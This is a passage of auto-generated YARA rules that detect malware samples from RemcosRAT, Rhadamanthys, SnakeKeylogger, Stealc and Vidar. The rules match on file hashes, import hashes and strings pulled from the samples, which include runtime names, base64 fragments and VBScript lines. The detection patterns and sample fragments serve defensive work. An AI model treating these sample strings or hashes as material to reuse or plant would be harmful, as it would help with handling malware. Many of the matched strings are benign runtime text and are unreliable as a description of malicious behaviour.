      $s11 = "System.Diagnostics.DiagnosticSource" fullword ascii /* score: '10.00'*/
      $s12 = "0NotFiniteNumberException.NotImplementedException*NotSupportedException" fullword ascii /* score: '10.00'*/
      $s13 = "GetStatus@" fullword ascii /* score: '9.00'*/
      $s14 = "get_Token@" fullword ascii /* score: '9.00'*/
      $s15 = " CombineSelectorsM" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_89 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
   strings:
      $s1 = "*NDynamicGenericMethodComponentsHashtableDMethodDescBasedGenericMethodLookup" fullword ascii /* score: '13.00'*/
      $s2 = "*2RuntimeMethodKeyHashtable" fullword ascii /* score: '13.00'*/
      $s3 = "get_ReturnType4get_RuntimeReturnParameter@" fullword ascii /* score: '12.00'*/
      $s4 = ":get_ContainsGenericParameters$GetRootElementType" fullword ascii /* score: '12.00'*/
      $s5 = "&GetMethodImplCommon" fullword ascii /* score: '12.00'*/
      $s6 = "<get_IsConstructedGenericMethod&get_IsGenericMethod:get_IsGenericMethodDefinition0get_RuntimeDeclaringType@" fullword ascii /* score: '12.00'*/
      $s7 = " CompilerServices" fullword ascii /* score: '12.00'*/
      $s8 = "*,RuntimeMethodHandleKey" fullword ascii /* score: '10.00'*/
      $s9 = "*<InstantiatedMethodKeyHashtable" fullword ascii /* score: '10.00'*/
      $s10 = "*8InstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s11 = "*8DynamicGenericTypesHashtable*GenericTypeLookupData*LazyDictionaryContext" fullword ascii /* score: '10.00'*/
      $s12 = "*<DynamicGenericMethodsHashtable.GenericMethodLookupData" fullword ascii /* score: '10.00'*/
      $s13 = "**RuntimeFieldHandleKey" fullword ascii /* score: '10.00'*/
      $s14 = "**ArrayTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s15 = "*JMethodForInstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imphash__SnakeKeylogger_signature__995cce3d6fb20b2d8af502c8788f55d_90 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash2 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "@GetRuntimeMethodHandleComponents>GetRuntimeFieldHandleComponents@" fullword ascii /* score: '15.00'*/
      $s2 = "dSystem.Collections.Generic.ICollection<TValue>.Add@" fullword ascii /* score: '13.00'*/
      $s3 = "GetHashCode#" fullword ascii /* score: '12.00'*/
      $s4 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker" fullword ascii /* score: '11.00'*/
      $s5 = "TryGetSingle" fullword ascii /* score: '9.00'*/
      $s6 = "get_ParentName8get_TwoLetterISOLanguageName6get_TwoLetterISOCountryName(get_NumberGroupSizes@" fullword ascii /* score: '9.00'*/
      $s7 = "get_CanRead$GetIndexParameters" fullword ascii /* score: '8.00'*/
      $s8 = "bufferq" fullword ascii /* score: '8.00'*/
      $s9 = "buffersu" fullword ascii /* score: '8.00'*/
      $s10 = "offsety" fullword ascii /* score: '8.00'*/
      $s11 = "suffixm" fullword ascii /* score: '8.00'*/
      $s12 = "2CustomMethodInvokerAction" fullword ascii /* score: '8.00'*/
      $s13 = "prefixi" fullword ascii /* score: '8.00'*/
      $s14 = "optionse" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_RemcosRAT_signature__aa569300_91 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash3 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
      hash4 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */ /* score: '26.50'*/
      $s3 = "3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                        PE  ' */ /* score: '21.00'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s5 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s7 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s8 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s9 = "9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX1" ascii /* base64 encoded string '}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}' */ /* score: '18.00'*/
      $s10 = "AAAAAAAAAAAAAD" ascii /* base64 encoded string '          ' */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                         ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                               ' */ /* score: '16.50'*/
      $s13 = "AABAAAAAAAA" ascii /* base64 encoded string '  @     ' */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                               ' */ /* score: '16.50'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                               ' */ /* score: '16.50'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4_imp_92 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash4 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $x1 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x2 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x3 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $s4 = "NSystem.ComponentModel.TypeConverter.dll" fullword ascii /* score: '29.00'*/
      $s5 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s6 = "Executor GeneratorSupport" fullword ascii /* score: '19.00'*/
      $s7 = "CompilerError.CompilerErrorCollection" fullword ascii /* score: '17.00'*/
      $s8 = "CodeConstructor4CodeDefaultValueExpression8CodeDelegateCreateExpression8CodeDelegateInvokeExpression.CodeDirectionExpression" fullword ascii /* score: '13.00'*/
      $s9 = "SmtpPermission.SmtpPermissionAttribute0NetworkInformationAccess8NetworkInformationPermissionJNetworkInformationPermissionAttribu" ascii /* score: '12.00'*/
      $s10 = "EventLogEntry.EventLogEntryCollection\"EventLogEntryType" fullword ascii /* score: '12.00'*/
      $s11 = "UriSection4UserScopedSettingAttribute\"UserSettingsGroup" fullword ascii /* score: '12.00'*/
      $s12 = "CodeDirective.CodeDirectiveCollection(CodeEntryPointMethod8CodeEventReferenceExpression" fullword ascii /* score: '12.00'*/
      $s13 = "SmtpPermission.SmtpPermissionAttribute0NetworkInformationAccess8NetworkInformationPermissionJNetworkInformationPermissionAttribu" ascii /* score: '12.00'*/
      $s14 = "erformanceCounterManager8PerformanceCounterPermissionDPerformanceCounterPermissionAccessJPerformanceCounterPermissionAttributeBP" ascii /* score: '11.00'*/
      $s15 = "LanguageOptions$TempFileCollection" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043_imphash__Stealc_signature__c7269d59926fa4252270f407e4dab043_imphas_93 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash2 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash3 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $s1 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '25.00'*/
      $s2 = "morebuf={pc:advertise errorasyncpreemptoffforce gc (idle)key has expiredmalloc deadlockmisaligned maskmissing mcache?ms: gomaxpr" ascii /* score: '19.00'*/
      $s3 = "ime.semacreateruntime.semawakeupruntime: heapGoal=runtime: npages = runtime: range = {streams pipe errorsystem page size (traceb" ascii /* score: '19.00'*/
      $s4 = "ocs=network is downno medium foundno such processpreempt SPWRITErecovery failedruntime error: runtime.gopanicruntime: frame runt" ascii /* score: '18.00'*/
      $s5 = "runtime.(*sweepLocker).blockCompletion" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.newSweepLocker" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.(*sweepLocker).dispose" fullword ascii /* score: '12.00'*/
      $s8 = "runtime.(*sweepLocker).sweepIsDone" fullword ascii /* score: '12.00'*/
      $s9 = "runtime.abiRegArgsType" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.abiRegArgsEface" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.mix32" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.gcenable_setup" fullword ascii /* score: '10.00'*/
      $s13 = "letionStatus failedcasfrom_Gscanstatus: gp->status is not in scan statefunction symbol table not sorted by program counter:mallo" ascii /* score: '8.00'*/
      $s14 = "ime: max = runtime: min = runtimer: bad pscan missed a gstartm: m has pstopm holding p already; errno= mheap.sweepgen= not in ra" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and pe.imphash() == "c7269d59926fa4252270f407e4dab043" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5867427e_RemcosRAT_signature__770b35ba_RemcosRAT_signature__b3e1a441_94 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5867427e.vbs, RemcosRAT(signature)_770b35ba.vbs, RemcosRAT(signature)_b3e1a441.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5867427e2a69435285a061f4cc882429558b4f7a2c0569219e74fdb7d68ec877"
      hash2 = "770b35baa103302f231c6be89e96d55294801a04aee02693842aa745f6dce621"
      hash3 = "b3e1a441845d5db54c8b20222f61259157d96a5c681ca893640d737b546e5420"
   strings:
      $s1 = "SSMON_LogError \"SMTP Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '23.00'*/
      $s2 = "WshShell.LogEvent 1, in_strMessage" fullword ascii /* score: '21.00'*/
      $s3 = "WScript.Arguments.ShowUsage" fullword ascii /* score: '18.00'*/
      $s4 = "SSMON_LogError \"MapNetworkDrive Error Detected: Error \" & Err.Number & \": \" & Err.Description & \" Source: \" & Err.Source" fullword ascii /* score: '18.00'*/
      $s5 = "Private Sub ProcessEvent" fullword ascii /* score: '18.00'*/
      $s6 = "= in_xmlElement.getAttribute( \"serverPassword\" )" fullword ascii /* score: '17.00'*/
      $s7 = "= in_xmlElement.getAttribute( \"serverPort\" ) + 0" fullword ascii /* score: '16.00'*/
      $s8 = "= in_xmlElement.getAttribute( \"reportPeriodMinutes\" ) + 0" fullword ascii /* score: '16.00'*/
      $s9 = "WScript.Echo in_strMessage" fullword ascii /* score: '13.00'*/
      $s10 = "WScript.Quit( 1 )" fullword ascii /* score: '13.00'*/
      $s11 = "If Not WScript.Arguments.Named.Exists(\"ConfigFile\") Then" fullword ascii /* score: '13.00'*/
      $s12 = "WScript.Echo Now" fullword ascii /* score: '13.00'*/
      $s13 = "WScript.Echo \"No administrator defined. Ignoring \" & in_strEmailSubject" fullword ascii /* score: '13.00'*/
      $s14 = "WScript.Echo \"Verbose mode enabled\"" fullword ascii /* score: '13.00'*/
      $s15 = "= in_xmlElement.getAttribute( \"formatAsHtml\" ) + 0" fullword ascii /* score: '13.00'*/
   condition:
      ( ( uint16(0) == 0x0a0d or uint16(0) == 0x5627 ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__75a4146a_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_95 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_75a4146a.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ae129ff9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_57910164.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ad188854.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af1dac32.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f7fe3016.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "75a4146af3520c8bb236cfe21ef507eec5f8a082ab20f4dfad55765b6fc04049"
      hash2 = "ae129ff90d7634798454e7df6ea731577ce9cc456fb6f2497f3af1c77abbb815"
      hash3 = "579101645425dfc71e51c4200cbb69b6ffb0429254a86c913d48f0cebbfcc85a"
      hash4 = "ad188854da20c440975e7bf1bfc218c1917da6d7155c77b8c03fefc148ac1759"
      hash5 = "af1dac32cb850795edce8871424e105668dd55e7cab6d1087a1d484e95f5ce83"
      hash6 = "f7fe3016d93d6ccf5f6bde386675afa006b920e015ad70a8698f8524380635b2"
   strings:
      $s1 = "{0}. {1} - {2} pts ({3} attempts) [{4}] - {5}" fullword wide /* score: '19.00'*/
      $s2 = "GetTargetNumber" fullword ascii /* score: '14.00'*/
      $s3 = "targetNumber" fullword ascii /* score: '14.00'*/
      $s4 = "lblAttempts" fullword wide /* score: '11.00'*/
      $s5 = "<Attempts>k__BackingField" fullword ascii /* score: '11.00'*/
      $s6 = "Attempts: {0}" fullword wide /* score: '11.00'*/
      $s7 = "Congratulations! You guessed it in {0} attempts!" fullword wide /* score: '11.00'*/
      $s8 = "Attempts:" fullword wide /* score: '11.00'*/
      $s9 = "<GetHighScores>b__4_2" fullword ascii /* score: '9.00'*/
      $s10 = "GetHighScores" fullword ascii /* score: '9.00'*/
      $s11 = "<GetHighScores>b__1" fullword ascii /* score: '9.00'*/
      $s12 = "gameLogic" fullword ascii /* score: '9.00'*/
      $s13 = "<GetHighScores>b__4_0" fullword ascii /* score: '9.00'*/
      $s14 = "GameLogic" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__96 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "internal/syscall/windows.procGetProcessMemoryInfo" fullword ascii /* score: '16.00'*/
      $s2 = "internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s3 = "os.ErrProcessDone" fullword ascii /* score: '15.00'*/
      $s4 = "internal/syscall/windows.procNetUserGetLocalGroups" fullword ascii /* score: '14.00'*/
      $s5 = "io.ErrClosedPipe" fullword ascii /* score: '13.00'*/
      $s6 = "kroot jobsmakechan: bad alignmentmissing type in runfinqnanotime returning zerono space left on deviceoperation not permittedope" ascii /* score: '12.00'*/
      $s7 = "os/executable.go" fullword ascii /* score: '12.00'*/
      $s8 = "os/exec.go" fullword ascii /* score: '12.00'*/
      $s9 = "os/exec_windows.go" fullword ascii /* score: '12.00'*/
      $s10 = "os/executable_windows.go" fullword ascii /* score: '12.00'*/
      $s11 = "os/tempfile.go" fullword ascii /* score: '11.00'*/
      $s12 = "runtime.fingCreate" fullword ascii /* score: '10.00'*/
      $s13 = "io/pipe.go" fullword ascii /* score: '10.00'*/
      $s14 = "time.atoiError" fullword ascii /* score: '10.00'*/
      $s15 = "value=connectconsolecpuproffloat32float64forcegcgctracehead = invalidpanic: runningsyscalluintptrunknownwaiting bytes,  etypes  " ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__SnakeKeylogger_signature__995cce3d6fb20b2d8af502c8788f55d7_i_97 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
   strings:
      $s1 = "        publickeublickeykeytokenretargetrgetablecontentttenttypewindowsrsruntime" fullword wide /* score: '28.00'*/
      $s2 = "2System.ComponentModel.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s3 = "xSystem.Collections.Generic.IEnumerator<TElement>.get_Current" fullword ascii /* score: '15.00'*/
      $s4 = "4ParseProcessorArchitecture@" fullword ascii /* score: '15.00'*/
      $s5 = "@<ExecuteCallbackHandlers>b__38_0" fullword ascii /* score: '14.00'*/
      $s6 = "&TryGetFieldAccessor(get_FieldRuntimeTypeBget_ExplicitLayoutFieldOffsetData&get_FieldTypeHandle@" fullword ascii /* score: '12.00'*/
      $s7 = "<UnregisterCancellationCallback:get_InvokeMayRunArbitraryCode@" fullword ascii /* score: '12.00'*/
      $s8 = "ParseErrorl<ParseNamedTypeName>g__ApplyLeadingDotCompatQuirk|20_0" fullword ascii /* score: '10.00'*/
      $s9 = "Version string portion was too short or too long" fullword wide /* score: '10.00'*/
      $s10 = "InternalSample,GetSampleForLargeRange*get_HasDaylightSaving@" fullword ascii /* score: '9.00'*/
      $s11 = "*GetArrayDataReference]" fullword ascii /* score: '9.00'*/
      $s12 = "\"get_ReflectedType,get_IsGenericParameter8get_IsGenericMethodParameter\"get_IsGenericType6get_IsGenericTypeDefinition" fullword ascii /* score: '9.00'*/
      $s13 = "GetTypeCodeImpl IsInstanceOfType" fullword ascii /* score: '9.00'*/
      $s14 = " CompleteTimedOut" fullword ascii /* score: '9.00'*/
      $s15 = "$get_MoveNextAction@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__7f46e341_98 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_7f46e341.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
   strings:
      $s1 = "UG9zdFF1aXRNZXNzYWdlAAAAUG9zdE1lc3NhZ2VBAAAAAFBlZWtNZXNzYWdlVwAAAABQZWVrTWVzc2FnZUEAAAAAT2Zmc2V0UmVjdAAAAABPZW1Ub0NoYXJBAAAAAE1l" ascii /* base64 encoded string 'PostQuitMessage   PostMessageA    PeekMessageW    PeekMessageA    OffsetRect    OemToCharA    Me' */ /* score: '21.00'*/
      $s2 = "FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s3 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA5" ascii /* base64 encoded string '                             9' */ /* score: '17.00'*/
      $s5 = "AEAAAEAAAD" ascii /* base64 encoded string ' @  @  ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                ' */ /* score: '16.50'*/
      $s7 = "ADAAAAAAAAA" ascii /* base64 encoded string ' 0      ' */ /* score: '16.50'*/
      $s8 = "AAAAAEAAAD" ascii /* base64 encoded string '    @  ' */ /* score: '16.50'*/
      $s9 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */ /* score: '14.00'*/
      $s10 = "CAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */ /* score: '12.50'*/
      $s11 = "AAAAAAEAAAAAAACAAAAA" ascii /* base64 encoded string '    @         ' */ /* score: '12.50'*/
      $s12 = "0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q0v8PENL/DxDS/w8Q" ascii /* score: '11.00'*/
      $s13 = "AAAA/gAAAP4AAAH+AAAB/wAAA/8AAAP/gAAH/4AAB//AAA3/wAAd/8AAGf7AAAG2wAABtsAAAbYAAAGwAAABgAAAAYAAAAGAAAABgAAAAAAAAAAAAAD/////////////" ascii /* score: '11.00'*/
      $s14 = "//////////////////////////////8B///+AP///gD///4A///+AP///AD///wAf//4AH//+AA///AAP//wAB//4AAf/8AAH//AAB//xAAf//wAH//8AT///An///wP" ascii /* score: '11.00'*/
      $s15 = "AdAB5ACAAcAB" ascii /* base64 encoded string 't y   p ' */ /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__a8741f2d_RemcosRAT_signature__aa569300_99 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_a8741f2d.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
      hash2 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                               ' */ /* score: '26.50'*/
      $s2 = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                             ' */ /* score: '18.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string '                             ;' */ /* score: '17.00'*/
      $s4 = "AAAAAAAAAAAAAABAAAAA" ascii /* base64 encoded string '           @   ' */ /* score: '16.50'*/
      $s5 = "AABAAAAAAAAAAAAAADAAAAAAAAA" ascii /* base64 encoded string '  @          0      ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                                ' */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                               ' */ /* score: '16.50'*/
      $s8 = "ADAAAAAAAAAAAAAAAB" ascii /* base64 encoded string ' 0           ' */ /* score: '16.50'*/
      $s9 = "4AAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* score: '14.00'*/
      $s10 = "fEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '|@                            ' */ /* score: '14.00'*/
      $s11 = "AAAAAHeAD3BwcHBwd4APcAAAAAB3gA93BwcHB3eAD////////4AAAAAAAAAAAMzMzMzMzMzMKAAAABAAAAAPAAAAAQAEAAAAAAB4AAAAAAAAAAAAAAAQAAAAEAAAAAAA" ascii /* score: '12.00'*/
      $s12 = "/4N+DAB1CYvWi8OLCP9R8F5bw41AAIsQ/1Jcw4vAi0B4iwj/UQjDjUAA9kBSEA+VwMNTVovai/CLxujr////Oth0G4TbdAmBTlAAABAA6weBZlD//+//i8aLEP9SXF5b" ascii /* score: '11.00'*/
      $s13 = "b19fb29fb19" ascii /* base64 encoded string 'o__oo_o_' */ /* score: '11.00'*/
      $s14 = "hMB0BTPAXlvDsAFeW8NTVovYi3NshfZ0EIvGixD/UjiEwHQFM8BeW8OwAV5bw1NWi9iLc2yF9nQQi8aLEP9SMITAdAUzwF5bw7ABXlvDU1aL2ItzbIX2dBCLxosQ/1JE" ascii /* score: '11.00'*/
